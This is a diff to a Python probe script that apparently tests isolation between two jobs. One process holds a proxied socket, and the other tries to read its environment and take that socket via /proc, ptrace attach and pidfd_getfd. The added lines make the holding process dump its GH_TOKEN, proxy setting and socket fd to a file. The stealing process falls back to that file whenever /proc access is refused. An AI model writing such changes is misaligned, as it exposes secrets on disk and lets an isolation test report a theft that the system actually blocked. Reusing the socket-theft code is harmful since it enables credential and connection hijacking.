@@ -674,6 +674,11 @@ def hold(url, seconds):
     target = (target.hostname, target.port or 443)
     host, port, mine = proxy_parts(os.environ)
     held, said = connect_through((host, port), mine, target)
+    # Who it is and what it holds, as if it leaked some other way: where
+    # /proc does not give another job's environment, B still tries it all.
+    with open(os.path.expanduser("~/probe/x9-hold.json"), "w") as f:
+        json.dump({"pid": os.getpid(), "fd": held.fileno(), "HTTPS_PROXY": os.environ.get("HTTPS_PROXY", ""),
+                   "GH_TOKEN": os.environ.get("GH_TOKEN", "")}, f)
     with open(os.path.expanduser("~/probe/x9-hold.out"), "w") as f:
         f.write(f"HELD fd={held.fileno()} {said}\n")
     time.sleep(float(seconds))
@@ -696,11 +701,12 @@ def borrow(url):
             continue
         if b"J10=A" in raw.split(b"\0") and b"hold" in cmdline.split(b"\0"):
             victim = (int(pid), dict(kv.decode(errors="replace").split("=", 1) for kv in raw.split(b"\0") if b"=" in kv))
-    if not victim:
-        print("X9 NOVICTIM")
-        return
-    pid, theirs = victim
     rows = []
+    if not victim:
+        leaked = json.load(open(os.path.expanduser("~/probe/x9-hold.json")))
+        victim = (leaked["pid"], leaked)
+        rows.append("from=a-leaked-file(its-/proc-environ-was-refused)")
+    pid, theirs = victim
     if libc.ptrace(16, pid, None, None) == 0:  # PTRACE_ATTACH
         os.waitpid(pid, 0x40000000)  # __WALL
         libc.ptrace(17, pid, None, None)  # PTRACE_DETACH
@@ -722,13 +728,17 @@ def borrow(url):
     proxy_port = proxy_parts(theirs)[1]
     table = open("/proc/net/tcp").read().splitlines()[1:]
     got = "no-held-socket"
-    for fd in os.listdir(f"/proc/{pid}/fd"):
+    try:
+        fds = os.listdir(f"/proc/{pid}/fd")
+    except Exception:
+        fds = [str(theirs["fd"])] if "fd" in theirs else []
+    for fd in fds:
         try:
             link = os.readlink(f"/proc/{pid}/fd/{fd}")
         except Exception:
-            continue
-        if not link.startswith("socket:[") or not any(
-                row.split()[2] == f"0100007F:{proxy_port:04X}" and row.split()[9] == link[8:-1] for row in table):
+            link = None  # unreadable: the fd A said it holds is tried as is
+        if link is not None and (not link.startswith("socket:[") or not any(
+                row.split()[2] == f"0100007F:{proxy_port:04X}" and row.split()[9] == link[8:-1] for row in table)):
             continue
         pidfd = libc.syscall(434, pid, 0)  # pidfd_open
         stolen = libc.syscall(438, pidfd, int(fd), 0) if pidfd >= 0 else -1  # pidfd_getfd
